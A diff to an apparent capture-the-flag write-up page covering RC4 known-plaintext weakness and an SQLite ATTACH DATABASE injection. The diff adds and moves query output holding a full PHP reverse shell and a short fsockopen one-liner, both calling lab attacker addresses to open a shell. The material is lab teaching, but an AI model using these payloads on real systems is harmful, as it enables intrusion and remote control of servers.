@@ -317,7 +317,7 @@ Query OK, 1 row affected (0.032 sec)
 
 <h2 id="weak-encryption">Weak encryption</h2>
 
-<p>The webservice we find is a tool that allows us to encrypt files with two stream cyphers, AES-CBC and <strong>RC4</strong>. The decryption part is still under construction. RC4 is vulnerable to <a href="https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext">known-cleartext attacks</a> under the condition in which the keystream generated has always the same initialization vector.</p>
+<p>We found a webservice exposing a tool that allows us to encrypt files with two stream cyphers, AES-CBC and <strong>RC4</strong>. The decryption part is still under construction. RC4 is vulnerable to <a href="https://crypto.stackexchange.com/questions/45021/rc4-finding-key-if-we-know-plain-text-and-ciphertext">known-cleartext attacks</a> under the condition in which the keystream generated has always the same initialization vector.</p>
 
 <p>The logic behind the attack can be summed up in the following steps:</p>
 
@@ -474,7 +474,7 @@ else
 &lt;head&gt;&lt;/head&gt;
 &lt;body&gt;
 Opened database successfully
-Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&lt;?php set_time_limit(0);$i="10.10.16.9";$p=91;$cs=1400;$sh="/bin/sh -i";$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&gt;');-- 
+Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES (&lt;?php'$s=fsockopen("10.10.16.44",9119);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;?&gt;');-- 
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre>
@@ -498,6 +498,13 @@ root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis /dev/d9e28afcf
 listening on [any] 9119 ...
 
 root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+Opened database successfully
+Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&lt;?php set_time_limit(0);$i="10.10.16.9";$p=91;$cs=1400;$sh="/bin/sh -i";$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&gt;');-- 
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
 
 <p>Then, let’s call the created page:</p>
@@ -760,6 +767,15 @@ root
 <div class="related">
   <h2>Related Posts</h2>
   <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2019/10/04/ghoul/">
+            Ghoul - 10.10.10.101
+            <small>04 Oct 2019</small>
+          </a>
+        </h3>
+      </li>
     
       <li>
         <h3>
